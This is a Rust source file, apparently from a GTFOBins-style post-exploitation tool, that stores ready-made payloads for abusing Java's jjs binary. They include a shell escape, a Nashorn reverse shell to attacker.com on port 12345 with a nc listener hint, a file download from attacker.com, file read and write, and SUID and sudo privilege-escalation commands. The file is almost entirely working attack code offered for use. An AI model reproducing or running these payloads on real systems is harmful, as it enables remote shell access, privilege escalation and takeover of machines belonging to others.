pub static BIN_NAME: &'static str = "jjs";
pub static BIN_DESC: &'static str = "This tool is installed starting with java SE 8.";
pub static SH_CODE: &'static str = r#"
    
    echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
	    export RPORT=12345
	    echo 'var host=Java.type("java.lang.System").getenv("RHOST");
	    var port=Java.type("java.lang.System").getenv("RPORT");
	    var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
	    var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
	    var Socket = Java.type("java.net.Socket");
	    var s=new Socket(host,port);
	    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
	    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
"#; // formatting error so added tabs to all lines except first
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    export LFILE=file_to_save
    echo "var URL = Java.type('java.net.URL');
    var ws = new URL('$URL');
    var Channels = Java.type('java.nio.channels.Channels');
    var rbc = Channels.newChannel(ws.openStream());
    var FileOutputStream = Java.type('java.io.FileOutputStream');
    var fos = new FileOutputStream('$LFILE');
    fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
    fos.close();
    rbc.close();" | jjs
"#;
pub static FW_CODE: &'static str = r#"
    
    echo 'var FileWriter = Java.type("java.io.FileWriter");
    var fw=new FileWriter("./file_to_write");
    fw.write("DATA");
    fw.close();' | jjs
"#;
pub static FR_CODE: &'static str = r#"
    
    echo 'var BufferedReader = Java.type("java.io.BufferedReader");
    var FileReader = Java.type("java.io.FileReader");
    var br = new BufferedReader(new FileReader("file_to_read"));
    while ((line = br.readLine()) != null) { print(line); }' | jjs
"#;
pub static SUID_DESC: &'static str =
    "This has been found working in macOS but failing on Linux systems.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which jjs) .

    echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
"#;
pub static SUDO_CODE: &'static str = r#"
    
    echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
